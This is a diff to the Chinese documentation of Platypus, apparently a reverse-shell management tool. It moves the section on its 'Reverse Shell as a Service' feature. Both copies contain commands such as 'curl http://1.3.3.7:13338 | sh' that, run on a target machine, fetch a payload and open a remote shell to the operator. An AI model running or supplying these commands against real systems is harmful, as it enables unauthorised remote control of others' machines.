@@ -22,6 +22,35 @@
 
 如果您对 Platypus 的具体启动流程感兴趣，可以参考[本文](./run.md)。
 
+
+## 反弹一个反向 Shell
+
+受到 [lukechilds](https://github.com/lukechilds) 的 [reverse-shell](https://github.com/lukechilds/reverse-shell) 项目的启发，Platypus 支持 Reverse Shell as a Serivce (RaaS)，基本语法与其相同。在 RicterZ 的[推荐](https://github.com/WangYihang/Platypus/issues/30)下，增加了一些不同语言的反向 Shell 的 Payload。
+
+您可以直接在目标机器上执行如下命令得到一个反向 Shell，从此不用再记忆各种繁琐的反向 Shell 命令。
+如果您希望了解更加高级的 RaaS 的用法，请参考[本文](./../../RaaS.md)。
+
+```bash
+curl http://1.3.3.7:13338 | sh
+```
+
+### 反弹 Shell 至当前 Platypus（`1.3.3.7:13338`）
+
+```bash
+curl http://1.3.3.7:13338 | sh
+curl http://1.3.3.7:13338/python | sh
+```
+
+### 反弹 Shell 至其他平台（`2.3.3.7:4444`）
+
+```bash
+curl http://1.3.3.7:13338/2.3.3.7/4444 | sh
+curl http://1.3.3.7:13338/2.3.3.7/4444/ruby | sh
+```
+
+反弹成功之后，Platypus 会对新上线的 Shell 进行基础的信息搜集（如：操作系统，用户名等），
+当信息搜集结束后，即可利用 Platypus 与之进行交互。
+
 ## 与 Platypus 交互
 
 !!! Hint
@@ -109,33 +138,6 @@ Platypus 的命令行模式支持 `Help`、`List`、`Jump`、`Download`、`Uploa
 » Download /tmp/www.tar.gz ./www.tar.gz
 ```
 
-## 反弹一个反向 Shell
-
-受到 [lukechilds](https://github.com/lukechilds) 的 [reverse-shell](https://github.com/lukechilds/reverse-shell) 项目的启发，Platypus 支持 Reverse Shell as a Serivce (RaaS)，基本语法与其相同，但增加了一些不同语言的反向 Shell 的 Payload。
-
-您可以直接在目标机器上执行如下命令得到一个反向 Shell，从此不用再记忆各种繁琐的反向 Shell 命令。
-如果您希望了解更加高级的 RaaS 的用法，请参考[本文](./../../RaaS.md)。
-
-```bash
-curl http://1.3.3.7:13338 | sh
-```
-
-### 反弹 Shell 至当前 Platypus（`1.3.3.7:13338`）
-
-```bash
-curl http://1.3.3.7:13338 | sh
-curl http://1.3.3.7:13338/python | sh
-```
-
-### 反弹 Shell 至其他平台（`2.3.3.7:4444`）
-
-```bash
-curl http://1.3.3.7:13338/2.3.3.7/4444 | sh
-curl http://1.3.3.7:13338/2.3.3.7/4444/ruby | sh
-```
-
-反弹成功之后，Platypus 会对新上线的 Shell 进行基础的信息搜集（如：操作系统，用户名等），
-当信息搜集结束后，即可利用 Platypus 与之进行交互。
 
 ## 升级至 Termite（推荐）
 
